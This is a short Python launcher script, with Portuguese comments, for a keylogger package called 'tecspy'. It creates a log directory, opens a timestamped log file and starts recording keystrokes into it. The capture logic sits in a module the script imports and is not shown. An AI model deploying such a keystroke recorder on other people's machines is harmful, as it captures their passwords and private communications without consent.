from tecspy.keylogger import KeyLogger
from tecspy.logger import Logger
from tecspy.config import get_log_file_path
from tecspy.utils import create_log_directory
import os

# Defina o diretório de logs na raiz do projeto
log_directory = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'logs')

# Cria o diretório de logs, se não existir
create_log_directory(log_directory)

# Gera o caminho do arquivo de log baseado na data e hora atuais
LOG_FILE_PATH = get_log_file_path()

# Inicializa o logger com o arquivo de log recém-criado
logger = Logger(LOG_FILE_PATH)

# Inicializa o keylogger
keylogger = KeyLogger(log_callback=logger.log_key)

# Inicia o keylogger
if __name__ == "__main__":
    keylogger.start()
